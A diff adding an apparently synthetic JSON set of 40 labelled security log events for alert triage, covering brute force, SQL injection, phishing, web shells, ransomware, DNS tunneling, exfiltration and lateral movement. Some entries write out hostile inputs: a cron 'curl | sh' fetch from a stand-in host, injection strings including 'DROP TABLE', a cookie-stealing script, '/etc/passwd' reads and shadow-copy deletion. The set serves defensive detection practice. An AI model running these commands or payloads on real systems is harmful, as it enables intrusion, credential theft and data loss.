@@ -1,0 +1,322 @@
+[
+  {
+    "id": 1,
+    "timestamp": "2026-09-14 08:02:11",
+    "source": "auth / srv-web-01",
+    "severity": "High",
+    "category": "Brute force",
+    "event": "sshd[2211]: Failed password for root from 203.0.113.45 port 51022 ssh2"
+  },
+  {
+    "id": 2,
+    "timestamp": "2026-09-14 08:02:14",
+    "source": "auth / srv-web-01",
+    "severity": "High",
+    "category": "Brute force",
+    "event": "sshd[2211]: Failed password for root from 203.0.113.45 port 51024 ssh2"
+  },
+  {
+    "id": 3,
+    "timestamp": "2026-09-14 08:02:19",
+    "source": "auth / srv-web-01",
+    "severity": "High",
+    "category": "Brute force",
+    "event": "sshd[2211]: Failed password for admin from 203.0.113.45 port 51030 ssh2"
+  },
+  {
+    "id": 4,
+    "timestamp": "2026-09-14 08:02:27",
+    "source": "auth / srv-web-01",
+    "severity": "High",
+    "category": "Brute force",
+    "event": "sshd[2211]: Failed password for ubuntu from 203.0.113.45 port 51041 ssh2"
+  },
+  {
+    "id": 5,
+    "timestamp": "2026-09-14 08:03:12",
+    "source": "auth / srv-web-01",
+    "severity": "High",
+    "category": "Brute force",
+    "event": "sshd[2211]: Failed password for admin from 203.0.113.45 port 51102 ssh2 (attempt 187 in 60s)"
+  },
+  {
+    "id": 6,
+    "timestamp": "2026-09-14 08:03:40",
+    "source": "auth / srv-web-01",
+    "severity": "Critical",
+    "category": "Brute force",
+    "event": "sshd[2211]: Accepted password for admin from 203.0.113.45 port 51119 ssh2"
+  },
+  {
+    "id": 7,
+    "timestamp": "2026-09-14 08:05:02",
+    "source": "sudo / srv-web-01",
+    "severity": "Critical",
+    "category": "Privilege escalation",
+    "event": "admin : TTY=pts/0 ; COMMAND=/usr/sbin/useradd -m -G sudo backupsvc"
+  },
+  {
+    "id": 8,
+    "timestamp": "2026-09-14 08:06:19",
+    "source": "cron / srv-web-01",
+    "severity": "Critical",
+    "category": "Persistence",
+    "event": "crontab[2390]: (backupsvc) REPLACE: * * * * * curl -s http://198.51.100.77/x.sh | sh"
+  },
+  {
+    "id": 9,
+    "timestamp": "2026-09-14 09:00:00",
+    "source": "backup / bkp-01",
+    "severity": "Info",
+    "category": "Benign",
+    "event": "Nightly backup job BK-0914 completed. 412 GB written, 0 errors."
+  },
+  {
+    "id": 10,
+    "timestamp": "2026-09-15 10:11:03",
+    "source": "web / srv-web-01",
+    "severity": "High",
+    "category": "SQL injection",
+    "event": "198.51.100.23 GET /products.php?id=1' OR '1'='1 HTTP/1.1 200"
+  },
+  {
+    "id": 11,
+    "timestamp": "2026-09-15 10:11:09",
+    "source": "web / srv-web-01",
+    "severity": "High",
+    "category": "SQL injection",
+    "event": "198.51.100.23 GET /products.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1 500"
+  },
+  {
+    "id": 12,
+    "timestamp": "2026-09-15 10:11:15",
+    "source": "web / srv-web-01",
+    "severity": "Critical",
+    "category": "SQL injection",
+    "event": "198.51.100.23 GET /products.php?id=1; DROP TABLE orders-- HTTP/1.1 500"
+  },
+  {
+    "id": 13,
+    "timestamp": "2026-09-15 10:30:44",
+    "source": "mail / mx-01",
+    "severity": "High",
+    "category": "Phishing",
+    "event": "Inbound from hr-payroll@company-portall.com to 14 recipients. Subject: \"Urgent: Update your payroll details\". Link: http://company-portall.com/login"
+  },
+  {
+    "id": 14,
+    "timestamp": "2026-09-15 10:34:12",
+    "source": "proxy / px-01",
+    "severity": "Critical",
+    "category": "Phishing",
+    "event": "user=jmartinez POST http://company-portall.com/login (form fields: username, password) 302"
+  },
+  {
+    "id": 15,
+    "timestamp": "2026-09-15 10:41:55",
+    "source": "auth / o365",
+    "severity": "Critical",
+    "category": "Account compromise",
+    "event": "Successful sign-in for jmartinez from 185.220.101.9 (Tor exit). Previous sign-in 10:02 from Sacramento, CA. Impossible travel."
+  },
+  {
+    "id": 16,
+    "timestamp": "2026-09-16 02:14:00",
+    "source": "firewall / fw-edge",
+    "severity": "Medium",
+    "category": "Reconnaissance",
+    "event": "192.0.2.88 -> 10.0.0.5 SYN to ports 21,22,23,25,80,110,143,443,445,3306,3389,8080 within 4s (DENY x11, ALLOW 443)"
+  },
+  {
+    "id": 17,
+    "timestamp": "2026-09-16 02:14:04",
+    "source": "firewall / fw-edge",
+    "severity": "Medium",
+    "category": "Reconnaissance",
+    "event": "192.0.2.88 -> 10.0.0.6 SYN to ports 21,22,23,25,80,110,143,443,445,3306,3389,8080 within 4s (DENY x12)"
+  },
+  {
+    "id": 18,
+    "timestamp": "2026-09-16 02:15:30",
+    "source": "firewall / fw-edge",
+    "severity": "High",
+    "category": "Reconnaissance",
+    "event": "192.0.2.88 -> 10.0.0.5:3389 TCP ALLOW (RDP exposed to internet)"
+  },
+  {
+    "id": 19,
+    "timestamp": "2026-09-16 08:00:00",
+    "source": "firewall / fw-edge",
+    "severity": "Info",
+    "category": "Benign",
+    "event": "Rule change by netadmin: allow 10.0.4.0/24 -> 10.0.0.9:8443. Change ticket CHG-2201 approved."
+  },
+  {
+    "id": 20,
+    "timestamp": "2026-09-17 13:22:08",
+    "source": "web / srv-web-02",
+    "severity": "Critical",
+    "category": "Web shell",
+    "event": "203.0.113.102 POST /uploads/avatar.php filename=shell.php Content-Type=image/jpeg 200"
+  },
+  {
+    "id": 21,
+    "timestamp": "2026-09-17 13:22:41",
+    "source": "web / srv-web-02",
+    "severity": "Critical",
+    "category": "Web shell",
+    "event": "203.0.113.102 GET /uploads/shell.php?cmd=whoami 200 (response: www-data)"
+  },
+  {
+    "id": 22,
+    "timestamp": "2026-09-17 13:23:05",
+    "source": "web / srv-web-02",
+    "severity": "Critical",
+    "category": "Web shell",
+    "event": "203.0.113.102 GET /uploads/shell.php?cmd=cat+/etc/passwd 200"
+  },
+  {
+    "id": 23,
+    "timestamp": "2026-09-18 09:05:33",
+    "source": "edr / WS-FIN-07",
+    "severity": "High",
+    "category": "Malware",
+    "event": "user=kpatel WINWORD.EXE spawned powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0..."
+  },
+  {
+    "id": 24,
+    "timestamp": "2026-09-18 09:05:40",
+    "source": "edr / WS-FIN-07",
+    "severity": "Critical",
+    "category": "Command and control",
+    "event": "powershell.exe outbound TCP 45.77.213.9:4444 established. Beacon interval 60s."
+  },
+  {
+    "id": 25,
+    "timestamp": "2026-09-18 09:07:12",
+    "source": "edr / WS-FIN-07",
+    "severity": "Critical",
+    "category": "Ransomware",
+    "event": "1,842 files renamed with extension .locked in \\\\WS-FIN-07\\Users\\kpatel. README_RESTORE.txt written to 94 folders."
+  },
+  {
+    "id": 26,
+    "timestamp": "2026-09-18 09:08:00",
+    "source": "edr / WS-FIN-07",
+    "severity": "Critical",
+    "category": "Ransomware",
+    "event": "cmd.exe: vssadmin delete shadows /all /quiet"
+  },
+  {
+    "id": 27,
+    "timestamp": "2026-09-18 12:00:00",
+    "source": "update / WS-FIN-03",
+    "severity": "Info",
+    "category": "Benign",
+    "event": "Windows Update KB5049112 installed successfully. Reboot scheduled 18:00."
+  },
+  {
+    "id": 28,
+    "timestamp": "2026-09-19 22:40:17",
+    "source": "dns / dns-01",
+    "severity": "Medium",
+    "category": "DNS tunneling",
+    "event": "WS-ENG-12 (10.0.4.31) TXT query a3f9c2e1b0d47718c5a4e2f1d9c3b7a6e5f4d3c2b1a0f9e8d7c6b5a4f3e2d1.tunnel.evil-cdn.net"
+  },
+  {
+    "id": 29,
+    "timestamp": "2026-09-19 22:40:18",
+    "source": "dns / dns-01",
+    "severity": "Medium",
+    "category": "DNS tunneling",
+    "event": "WS-ENG-12 (10.0.4.31) TXT query 7b2e4f1c9d0a3e5f8b6c4d2a1e9f7c3b5d8a6e4f2c1b9d7a5e3f1c8b6d4a2e0.tunnel.evil-cdn.net"
+  },
+  {
+    "id": 30,
+    "timestamp": "2026-09-19 22:50:00",
+    "source": "dns / dns-01",
+    "severity": "High",
+    "category": "DNS tunneling",
+    "event": "Anomaly: 4,210 TXT queries from WS-ENG-12 to *.tunnel.evil-cdn.net in 10 min. Avg label length 61 chars."
+  },
+  {
+    "id": 31,
+    "timestamp": "2026-09-20 03:00:00",
+    "source": "firewall / fw-edge",
+    "severity": "High",
+    "category": "Data exfiltration",
+    "event": "10.0.0.22 (db-01) -> 91.108.4.55:443 outbound 3.2 GB over 41 min. Baseline for host: 12 MB/day."
+  },
+  {
+    "id": 32,
+    "timestamp": "2026-09-20 03:12:00",
+    "source": "dlp / px-01",
+    "severity": "Critical",
+    "category": "Data exfiltration",
+    "event": "user=svc_backup uploaded customers_export.csv (48,000 records, PII) to mega.nz"
+  },
+  {
+    "id": 33,
+    "timestamp": "2026-09-21 09:15:00",
+    "source": "auth / o365",
+    "severity": "Info",
+    "category": "Benign",
+    "event": "Successful sign-in for tnguyen from 10.0.4.19 (Sacramento office). MFA satisfied."
+  },
+  {
+    "id": 34,
+    "timestamp": "2026-09-21 11:00:00",
+    "source": "lb / lb-01",
+    "severity": "High",
+    "category": "DDoS",
+    "event": "28,000 req/s to /api/search from 2,400 unique IPs. Normal peak: 310 req/s."
+  },
+  {
+    "id": 35,
+    "timestamp": "2026-09-21 11:01:30",
+    "source": "lb / lb-01",
+    "severity": "Critical",
+    "category": "DDoS",
+    "event": "Backend pool health degraded: 5/8 nodes failing checks. 503 rate 62%."
+  },
+  {
+    "id": 36,
+    "timestamp": "2026-09-22 15:45:10",
+    "source": "web / srv-web-01",
+    "severity": "High",
+    "category": "Cross-site scripting",
+    "event": "198.51.100.60 POST /comments body=<script>document.location='http://198.51.100.60/c?'+document.cookie</script> 201"
+  },
+  {
+    "id": 37,
+    "timestamp": "2026-09-23 07:30:00",
+    "source": "auth / o365",
+    "severity": "High",
+    "category": "Credential stuffing",
+    "event": "12,400 login attempts from 350 IPs in 15 min. 312 distinct usernames, 97% unique user/password pairs. 41 successful."
+  },
+  {
+    "id": 38,
+    "timestamp": "2026-09-23 07:45:00",
+    "source": "auth / vpn-01",
+    "severity": "Info",
+    "category": "Benign",
+    "event": "tnguyen: 3 failed logins then success from 10.0.4.19. Password reset ticket HD-5520 referenced."
+  },
+  {
+    "id": 39,
+    "timestamp": "2026-09-24 10:02:00",
+    "source": "smb / FS-01",
+    "severity": "Critical",
+    "category": "Lateral movement",
+    "event": "Connection to ADMIN$ from WS-FIN-07 as kpatel. Service PSEXESVC created."
+  },
+  {
+    "id": 40,
+    "timestamp": "2026-09-24 10:03:30",
+    "source": "smb / DC-01",
+    "severity": "Critical",
+    "category": "Lateral movement",
+    "event": "Connection to ADMIN$ from WS-FIN-07 as kpatel. Service PSEXESVC created. Logon type 3."
+  }
+]
